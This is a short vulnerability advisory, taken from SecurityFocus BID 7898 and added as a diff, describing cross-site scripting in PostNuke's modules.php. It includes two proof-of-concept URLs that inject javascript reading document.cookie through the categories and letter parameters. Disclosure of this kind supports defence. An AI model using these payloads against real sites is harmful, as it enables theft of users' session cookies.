@@ -1,0 +1,12 @@
+source: http://www.securityfocus.com/bid/7898/info
+
+The PostNuke 'modules.php' script does not sufficiently sanitize data supplied via URI parameters, making it prone to cross-site scripting attacks. This could allow for execution of hostile HTML and script code in the web client of a user who visits a web page that contains the malicious code.
+
+Exploitation could allow for theft of cookie-based authentication credentials. Other attacks are also possible.
+
+http://www.server.com/modules.php?op=modload&name=FAQ&file=index&myfaq=yes&i
+d_cat=1&categories=%3Cimg%20src=javascript:alert(document.cookie);%3E&parent
+_id=0
+
+http://www.server.com/modules.php?letter=%22%3E%3Cimg%20src=javascript:alert
+(document.cookie);%3E&op=modload&name=Members_List&file=index 
